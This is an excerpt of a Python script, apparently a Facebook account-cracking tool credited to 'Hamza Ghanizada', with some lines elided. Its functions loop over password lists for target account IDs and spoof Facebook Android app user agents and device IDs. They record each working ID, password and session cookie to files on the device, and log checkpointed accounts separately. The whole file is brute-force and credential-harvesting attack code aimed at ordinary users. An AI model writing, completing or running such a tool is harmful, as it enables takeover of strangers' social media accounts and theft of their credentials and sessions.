...
logo ="""
 ...
 \033[1;97m##     ## ##     ## ##     ## ######## ##     ##
\033[1;97m--------------------------------------------------
\033[1;91m Author      : Hamza Ghanizada
\033[1;91m GitHub      : https://github.com/hamza-ghanizada
\033[1;97m Facebook    : Hamza Ghanizada
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [HAMZA-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/480.0.0.55.88;FBBV/455016452;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/Hamza-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [Hamza-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/248.1.0.44.116;FBBV/184540730;FBDM/{density=2.7,width=1440,height=1920};FBLC/en_AF;FBCR/Banglalink;FBMF/Samsung;FBBD/Galaxy S10;FBPN/com.facebook.orca;FBDV/Galaxy S10/8.0;FBSV/8.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/Orca-Androi;FBAV/292.0.0.61.123;FBBV/251145743;FBDM/{density=1.9,width=2160,height=3840};FBLC/en_GB;FBCR/AWCC;FBMF/Samsung;FBBD/Galaxy S10;FBPN/com.facebook.orca;FBDV/Galaxy S10/8.0;FBSV/8.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/Orca-Android;FBAV/292.0.0.61.123;FBBV/251145743;FBDM/{density=1.9,width=720,height=1280};FBLC/ko_KR;FBCR/Claro;FBMF/Google;FBBD/Pixel 4;FBPN/com.facebook.orca;FBDV/Pixel 4/11.0;FBSV/11.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HAMZA-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/HAMZA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HAMZA-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
	...
	try:
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [HAMZA-CP] '+ids+' | '+pas)
				open('/sdcard/HAMZA-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [HAMZA-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/Hamza-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/HAMZA-OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
